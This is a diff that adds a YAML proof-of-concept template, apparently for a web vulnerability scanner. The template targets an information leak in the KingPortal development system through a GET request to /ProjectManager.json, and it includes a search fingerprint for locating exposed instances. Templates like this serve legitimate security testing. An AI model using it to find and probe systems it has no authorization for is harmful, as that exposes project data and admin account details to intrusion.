@@ -1,0 +1,16 @@
+id: poc-yaml-kingportal-projectmanager-json-info-leak
+info:
+  name: 北京亚控科技KingPortal开发系统 ProjectManager.json 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: KingPortal开发系统
+  hunter: web.title="KingPortal 开发系统客户端"
+requests:
+- method: GET
+  path: /ProjectManager.json
+  expression: "status_code == 200 && \ncontains(body,\"\\\"projectGroups\\\"\") &&\n\
+    contains(body,\"\\\"version\\\"\") &&\ncontains(body,\"\\\"admin001\\\"\") &&\n\
+    contains(content_type,\"application/json\")\n"
+variables: {}
+transport: http
